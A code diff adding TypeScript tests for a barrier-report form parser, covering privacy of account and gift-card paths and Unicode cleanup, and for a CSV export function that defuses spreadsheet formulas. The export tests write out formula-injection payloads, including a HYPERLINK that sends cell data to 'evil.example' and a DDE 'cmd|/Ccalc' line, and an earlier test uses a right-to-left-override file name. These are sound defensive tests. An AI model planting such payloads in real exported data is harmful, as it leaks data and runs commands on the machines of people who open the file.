@@ -8,8 +8,12 @@ import {
   MAX_PAGE_LENGTH,
   MIN_ELAPSED_MS,
   PAGE_TYPES,
+  PUBLIC_PAGE_TYPES,
+  exportCell,
   parseBarrierReport,
 } from '../src/barrier-report.ts';
+
+const cp = (...points: number[]): string => String.fromCodePoint(...points);
 
 const form = (fields: Record<string, string>): string => new URLSearchParams(fields).toString();
 const VALID = {
@@ -113,8 +117,11 @@ describe('parseBarrierReport', () => {
       'products',
       `/${'a'.repeat(MAX_PAGE_LENGTH)}`,
       '/a\u0000b',
+      `/products/${cp(0x202e)}gnp.exe`,
+      `/products/a${cp(0x200b)}b`,
+      '/products/a b',
     ]) {
-      const result = parseBarrierReport(form({ description: 'x', page }));
+      const result = parseBarrierReport(form({ description: 'x', page_type: 'product', page }));
       expect(result).toEqual({
         kind: 'accepted',
         report: expect.objectContaining({ page: null }) as unknown,
@@ -142,9 +149,55 @@ describe('parseBarrierReport', () => {
       });
     }
     const page = `/${'a'.repeat(MAX_PAGE_LENGTH - 1)}`;
-    expect(parseBarrierReport(form({ description: 'x', page }))).toEqual({
+    expect(parseBarrierReport(form({ description: 'x', page_type: 'page', page }))).toEqual({
       kind: 'accepted',
       report: expect.objectContaining({ page }) as unknown,
+    });
+  });
+
+  it('keeps the path only for public page types, never for account, gift card or password pages', () => {
+    expect([...PAGE_TYPES].filter((t) => !PUBLIC_PAGE_TYPES.has(t)).sort()).toEqual([
+      'captcha',
+      'customers/account',
+      'customers/activate_account',
+      'customers/addresses',
+      'customers/login',
+      'customers/order',
+      'customers/register',
+      'customers/reset_password',
+      'gift_card',
+      'password',
+    ]);
+    for (const [pageType, page] of [
+      ['customers/order', '/account/orders/1234567'],
+      ['gift_card', '/gift_cards/56174706753/0011c591fc720d0a51b80cdb694f969e'],
+    ] as const) {
+      expect(parseBarrierReport(form({ description: 'x', page_type: pageType, page }))).toEqual({
+        kind: 'accepted',
+        report: expect.objectContaining({ pageType, page: null }) as unknown,
+      });
+    }
+    expect(parseBarrierReport(form({ description: 'x', page: '/products/a' }))).toEqual({
+      kind: 'accepted',
+      report: expect.objectContaining({ pageType: null, page: null }) as unknown,
+    });
+  });
+
+  it('normalises to NFC after removing characters, removes invisible ones and keeps joiners', () => {
+    const decomposed = `e${cp(0x07)}${cp(0x301)} caf${cp(0x200b)}e${cp(0xfeff)}`;
+    expect(parseBarrierReport(form({ description: decomposed }))).toEqual({
+      kind: 'accepted',
+      report: expect.objectContaining({ description: `${cp(0xe9)} cafe` }) as unknown,
+    });
+    const lines = `one${cp(0x2028)}two${cp(0x2029)}three`;
+    expect(parseBarrierReport(form({ description: lines }))).toEqual({
+      kind: 'accepted',
+      report: expect.objectContaining({ description: 'one\ntwo\nthree' }) as unknown,
+    });
+    const persian = cp(0x645, 0x6cc, 0x200c, 0x62e, 0x648, 0x627, 0x647, 0x645);
+    expect(parseBarrierReport(form({ description: persian }))).toEqual({
+      kind: 'accepted',
+      report: expect.objectContaining({ description: persian }) as unknown,
     });
   });
 
@@ -191,5 +244,25 @@ describe('parseBarrierReport', () => {
   it('refuses a body over the size limit before parsing it', () => {
     const body = form({ description: 'x'.repeat(MAX_BODY_BYTES) });
     expect(parseBarrierReport(body)).toEqual({ kind: 'too-large' });
+  });
+});
+
+describe('exportCell', () => {
+  it('quotes every cell and doubles quotes', () => {
+    expect(exportCell('Low contrast')).toBe('"Low contrast"');
+    expect(exportCell('say "hi"')).toBe('"say ""hi"""');
+    expect(exportCell(null)).toBe('""');
+  });
+
+  it('defuses anything a spreadsheet would run as a formula', () => {
+    expect(exportCell('=HYPERLINK("https://evil.example/?"&A2,"x")')).toBe(
+      `"'=HYPERLINK(""https://evil.example/?""&A2,""x"")"`,
+    );
+    const leads = ['=', '+', '-', '@', '\t', '\r', cp(0xff1d), cp(0xff0b), cp(0xff0d), cp(0xff20)];
+    for (const lead of leads) {
+      expect(exportCell(`${lead}cmd`)).toBe(`"'${lead}cmd"`);
+    }
+    expect(exportCell("=cmd|'/Ccalc'!A0@x.y")).toBe(`"'=cmd|'/Ccalc'!A0@x.y"`);
+    expect(exportCell('a=b')).toBe('"a=b"');
   });
 });
